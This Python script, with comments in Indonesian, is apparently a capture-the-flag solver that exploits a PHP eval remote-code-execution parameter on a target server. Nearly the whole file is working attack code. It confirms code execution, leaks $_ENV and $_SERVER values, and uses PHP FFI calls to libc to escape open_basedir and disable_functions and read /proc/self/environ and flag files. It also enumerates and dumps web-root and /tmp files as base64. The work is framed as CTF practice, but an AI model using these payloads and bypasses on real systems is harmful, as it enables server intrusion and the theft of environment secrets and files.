#!/usr/bin/env python3
import sys, re, html, base64
from urllib.parse import urljoin
import requests

FLAG_RE = re.compile(r'([A-Za-z0-9_]{2,32}\{[^}\r\n]{5,200}\})')

def extract_dialogue(page: str) -> str:
    # Ambil output yang tampil setelah "[System]: ... received...</span>"
    m = re.search(r"received\.\.\.</span>\s*(.*?)\s*<span class=\"inline-block", page, re.S | re.I)
    if not m:
        # fallback kalau cursor span tidak ketemu
        m = re.search(r"received\.\.\.</span>\s*(.*?)\s*</div>\s*</div>", page, re.S | re.I)
    out = m.group(1) if m else ""
    out = re.sub(r"<[^>]+>", "", out)            # strip tags
    out = html.unescape(out)                     # decode &#039; dll
    return out.strip()

def find_flag(text: str) -> str | None:
    m = FLAG_RE.search(text)
    return m.group(1) if m else None

class Solver:
    def __init__(self, base_url: str):
        if not base_url.endswith("/"):
            base_url += "/"
        self.base_url = base_url
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": "CTF-Solver/1.0"})

    def send(self, cmd: str, timeout: int = 20) -> str:
        r = self.s.get(self.base_url, params={"cmd": cmd}, timeout=timeout)
        r.raise_for_status()
        return extract_dialogue(r.text)

    def banner(self):
        cmd = "echo 'PHP='.phpversion().\"\\n\";echo 'open_basedir='.ini_get('open_basedir').\"\\n\";"
        out = self.send(cmd)
        print(out)

    def try_env_arrays(self) -> str | None:
        cmd = (
            "foreach(['FLAG','flag','ACE','ace'] as $k){"
            "if(isset($_ENV[$k])) echo 'ENV '.$k.'='.$_ENV[$k].\"\\n\";"
            "if(isset($_SERVER[$k])) echo 'SRV '.$k.'='.$_SERVER[$k].\"\\n\";"
            "}"
            "foreach($_ENV as $k=>$v){if(!is_array($v)&&stripos($k,'flag')!==false) echo 'ENVHIT '.$k.'='.$v.\"\\n\";}"
            "foreach($_SERVER as $k=>$v){if(!is_array($v)&&stripos($k,'flag')!==false) echo 'SRVHIT '.$k.'='.$v.\"\\n\";}"
        )
        out = self.send(cmd)
        f = find_flag(out)
        if f:
            return f
        # kadang flag bukan format { } tapi ada keyword
        if "FLAG" in out.upper() and out.strip():
            print("[*] Possible env leakage:\n", out)
        return None

    def try_ffi_read(self) -> str | None:
        # Coba bypass open_basedir + disable_functions via FFI:
        # - baca /proc/self/environ (base64) cari "FLAG="
        # - baca beberapa path flag umum langsung
        cmd = (
            "echo 'FFI='.(class_exists('FFI')?'1':'0').\"\\n\";"
            "echo 'ffi.enable='.ini_get('ffi.enable').\"\\n\";"
            "if(class_exists('FFI') && ini_get('ffi.enable')!='0'){"
            "$f=FFI::cdef('int open(const char*,int); long read(int,void*,long); int close(int);','libc.so.6');"
            "$b=FFI::new('char[8192]');"
            "$fd=$f->open('/proc/self/environ',0);"
            "if($fd>=0){$n=$f->read($fd,$b,8191); if($n>0) echo 'ENV:' . base64_encode(FFI::string($b,$n)).\"\\n\"; $f->close($fd);}"
            "foreach(['/flag','/flag.txt','/home/ctf/flag','/home/ctf/flag.txt','/home/*/flag','/home/*/flag.txt'] as $p){"
            "$fd=$f->open($p,0);"
            "if($fd>=0){$n=$f->read($fd,$b,8191); if($n>0) echo 'FILE:' . $p . \"\\n\" . FFI::string($b,$n) . \"\\n\"; $f->close($fd);}"
            "}"
            "}"
        )
        out = self.send(cmd)
        # 1) cek output file langsung
        f = find_flag(out)
        if f:
            return f

        # 2) parse ENV:base64
        for line in out.splitlines():
            if line.startswith("ENV:"):
                b64 = line[4:].strip()
                try:
                    raw = base64.b64decode(b64, validate=False)
                except Exception:
                    continue
                # environ dipisah NUL
                for kv in raw.split(b"\x00"):
                    if kv.startswith(b"FLAG="):
                        try:
                            val = kv.split(b"=", 1)[1].decode(errors="replace")
                        except Exception:
                            val = repr(kv)
                        m = find_flag(val)
                        if m:
                            return m
                        print("[*] Found FLAG= but not brace-format:", val)
        return None

    def list_files(self) -> list[str]:
        # list file yang kemungkinan penting (php/txt/env/json/ini/db/sqlite/log/bak/old) + file kecil
        cmd = (
            "$R=['/var/www/html','/tmp'];$E=['php','txt','env','json','ini','db','sqlite','log','bak','old'];"
            "foreach($R as $r){"
            "$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($r,FilesystemIterator::SKIP_DOTS));"
            "foreach($it as $f){"
            "if(!$f->isFile()) continue;"
            "$p=$f->getPathname();"
            "$e=strtolower(pathinfo($p,PATHINFO_EXTENSION));"
            "if(in_array($e,$E)||$f->getSize()<20000) echo $p.\"\\n\";"
            "}"
            "}"
        )
        out = self.send(cmd, timeout=30)
        files = []
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("/var/www/html") or line.startswith("/tmp/"):
                files.append(line)
        return sorted(set(files))

    def read_file_b64(self, path: str) -> bytes | None:
        # output base64 biar aman dari HTML
        cmd = f"echo 'B64:' . base64_encode(@file_get_contents('{path}'));"
        out = self.send(cmd, timeout=20)
        m = re.search(r"B64:([A-Za-z0-9+/=]+)", out)
        if not m:
            return None
        try:
            return base64.b64decode(m.group(1), validate=False)
        except Exception:
            return None

    def analyze_blob(self, blob: bytes, origin: str) -> str | None:
        text = blob.decode(errors="replace")
        f = find_flag(text)
        if f:
            print(f"[+] Flag found in {origin}")
            return f

        # cari base64 string di dalam file lalu decode (kadang flag disimpan encoded)
        for b64cand in re.findall(r"[A-Za-z0-9+/=]{40,}", text):
            # skip terlalu panjang biar gak berat
            if len(b64cand) > 5000:
                continue
            try:
                dec = base64.b64decode(b64cand, validate=False)
            except Exception:
                continue
            dec_text = dec.decode(errors="replace")
            f2 = find_flag(dec_text)
            if f2:
                print(f"[+] Flag found via base64 decode in {origin}")
                return f2
        return None

    def dump_main_script(self) -> str | None:
        # Ambil SCRIPT_FILENAME lalu dump kontennya
        p = self.send("echo $_SERVER['SCRIPT_FILENAME'];")
        script_path = p.strip().splitlines()[-1].strip()
        if not script_path.startswith("/"):
            return None
        data = self.read_file_b64(script_path)
        if not data:
            return None
        return self.analyze_blob(data, script_path)

    def run(self):
        # sanity: RCE
        md5out = self.send("echo md5('a');")
        if "0cc175b9c0f1b6a831c399e269772661" not in md5out:
            print("[-] RCE test failed (md5 not found).")
            return 1

        print("[*] Target OK (PHP eval).")
        self.banner()

        # 1) coba leak via $_ENV/$_SERVER
        f = self.try_env_arrays()
        if f:
            print(f)
            return 0

        # 2) coba FFI bypass (paling penting buat kasus open_basedir + disable_functions)
        f = self.try_ffi_read()
        if f:
            print(f)
            return 0

        # 3) dump main script (kadang ada clue/flag/path)
        f = self.dump_main_script()
        if f:
            print(f)
            return 0

        # 4) enumerate & scan file di /var/www/html dan /tmp
        files = self.list_files()
        print(f"[*] Enumerated {len(files)} candidate files.")
        for path in files:
            data = self.read_file_b64(path)
            if not data:
                continue
            f = self.analyze_blob(data, path)
            if f:
                print(f)
                return 0

        print("[-] Flag not found via current methods.")
        print("[!] Jika ini masih gagal, kemungkinan butuh bypass lain (mis. FFI disabled + flag outside open_basedir) -> dump source manual & cari logic decode.")
        return 2

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} 'http://host:port/'")
        return 1
    sol = Solver(sys.argv[1])
    try:
        return sol.run()
    except requests.RequestException as e:
        print("HTTP error:", e)
        return 1

if __name__ == "__main__":
    raise SystemExit(main())
